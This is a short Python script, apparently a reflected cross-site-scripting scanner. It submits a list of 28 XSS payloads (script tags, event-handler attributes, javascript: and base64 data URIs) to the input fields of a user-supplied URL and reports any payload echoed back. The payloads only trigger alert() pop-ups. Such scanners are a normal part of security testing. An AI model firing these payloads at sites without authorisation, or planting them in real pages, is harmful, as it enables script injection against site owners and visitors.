import requests
from bs4 import BeautifulSoup

# Sample payloads to test for XSS. In real-world scenarios, this list will be much more extensive.
XSS_PAYLOADS = [
    '"><script>alert(\'XSS\')</script>',
    '\' onfocus=alert(document.domain) autofocus=1>',
    '<img src=x onerror=alert(\'XSS\')>',
    '<svg onload=alert(\'XSS\')>',
    '"><img src=x onerror=alert(\'XSS\')>',
    '<body onload=alert(\'XSS\')>',
    '<details open ontoggle=alert(\'XSS\')>',
    '"><svg/onload=alert(\'XSS\')>',
    '</script><script>alert(\'XSS\')</script>',
    '<a href=javascript:alert(\'XSS\')>Click Me</a>',
    '<iframe src=javascript:alert(\'XSS\')>',
    '<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ+YWxlcnQoIlhTUyIpOzwvc2NyaXB0Pjwvc3ZnPg==">',
    '<object data="javascript:alert(\'XSS\')">',
    '<svg xmlns="#"><script>alert(1)</script></svg>',
    '"><p style="position:absolute;width:100%;height:100%;top:0;left:0" onmouseover=alert(\'XSS\')></p>',
    '<a onmouseover=alert(\'XSS\')>Hover me!</a>',
    '<div style="width:100%;height:100%;position:fixed;top:0;left:0" onmouseover=alert(\'XSS\')></div>',
    'javascript:alert(\'XSS\')',
    '<base href="javascript:alert(\'XSS\')//">',
    '<a href="#" onclick=alert(\'XSS\')>Click Me</a>',
    '<img dynsrc="javascript:alert(\'XSS\')">',
    '<link rel=stylesheet href="javascript:alert(\'XSS\')">',
    '<table background="javascript:alert(\'XSS\')">',
    '<object type="text/x-scriptlet" data="http://site/path/to/file_with_scriptlet">',
    '<meta http-equiv="refresh" content="0; url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">',
    '"><script>eval(location.hash.slice(1))</script>#alert(\'XSS\')',
    '<img src="x`<script>alert(\'XSS\')</script>`">',
    '<a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="alert(\'XSS\');">X</a></a><a href="javascript:alert(\'XSS\')">X</a>'
]


def detect_xss(base_url, param_data):
    """Detect potential XSS vulnerabilities."""
    vulnerabilities = []

    for param in param_data:
        for payload in XSS_PAYLOADS:
            # Construct malicious data
            data = param_data.copy()
            data[param] = payload

            response = requests.get(base_url, params=data)

            # Check if payload is reflected in response
            if payload in response.text:
                vulnerabilities.append((base_url, param, payload))

    return vulnerabilities


def main():
    target_url = input("Enter the target URL (e.g., http://example.com/page.php): ")
    response = requests.get(target_url)

    # Parse the HTML and extract input fields
    soup = BeautifulSoup(response.text, "html.parser")
    inputs = soup.find_all('input')
    param_data = {inp['name']: '' for inp in inputs if inp.get('name')}

    vulnerabilities = detect_xss(target_url, param_data)

    if vulnerabilities:
        print("\nPotential XSS vulnerabilities found:")
        for url, param, payload in vulnerabilities:
            print(f"URL: {url}, Parameter: {param}, Payload: {payload}")
    else:
        print("\nNo potential XSS vulnerabilities found.")


if __name__ == "__main__":
    main()
